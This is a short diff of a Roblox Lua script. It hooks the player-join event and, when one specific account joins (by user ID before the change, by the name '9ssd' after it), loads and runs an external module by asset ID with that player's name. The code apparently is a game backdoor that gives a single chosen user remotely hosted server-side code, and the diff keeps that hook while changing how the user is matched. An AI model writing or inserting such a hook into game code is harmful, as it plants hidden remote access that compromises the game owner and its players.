@@ -1,5 +1,6 @@
-game.Players.PlayerAdded:Connect(function(obj)
-    if obj.UserId == 781984681 then
-        require(5196668511)(obj.Name)
+game.Players.PlayerAdded:Connect(function(player)
+    if player.Name == "9ssd" then
+        local character = player.Character or player.CharacterAdded:Wait()
+        require(5196668511)(player.Name)
     end
 end)
